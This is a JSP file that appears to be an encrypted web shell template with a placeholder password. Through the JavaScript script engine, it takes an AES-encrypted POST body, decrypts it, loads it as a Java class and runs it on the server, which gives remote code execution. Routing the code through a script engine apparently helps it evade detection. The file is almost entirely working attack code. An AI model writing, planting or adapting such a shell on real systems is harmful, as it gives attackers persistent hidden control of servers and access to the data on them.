<%@ page import="javax.script.ScriptEngine" %>
<%@ page import="javax.script.ScriptEngineManager" %>
<%
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
    U demo = new U(this.getClass().getClassLoader());
    engine.put("request",request);
    engine.put("response",response);
    engine.put("session", session);
    engine.put("pageContext",pageContext);
    engine.put("U",demo);

    String command = "try {\n" +
            "  load(\"nashorn:mozilla_compat.js\");\n" +
            "} catch (e) {}\n" +
            "importPackage(Packages.java.util);\n" +
            "importPackage(Packages.java.lang);\n" +
            "importPackage(Packages.javax.crypto);\n" +
            "importPackage(Packages.sun.misc);\n" +
            "importPackage(Packages.javax.crypto.spec);\n" +
            "function define(classBytes){\n" +
            "  \n" +
            "  var defineClassMethod =U.getClass().getDeclaredMethod(\"g\",classBytes.getClass());\n" +
            "  print(defineClassMethod)\n" +
            "  defineClassMethod.setAccessible(true);\n" +
            "  var cc=defineClassMethod.invoke(U,new Array(classBytes));\n" +
            "  cc.newInstance().equals(pageContext);\n" +
            "}\n" +
            "if (request.getMethod().equals(\"POST\")){\n" +
            "      var k=new java.lang.String(\"__PASSWORD__\");\n" +
            "      session.putValue(\"u\",k);\n" +
            "      var c=Cipher.getInstance(\"AES\");\n" +
            "      c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));\n" +
            "      define(c.doFinal(new BASE64Decoder().decodeBuffer(request.getReader().readLine())));\n" +
            "}";
    engine.eval(command);
%>

<%!
    class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
        }
    }
%>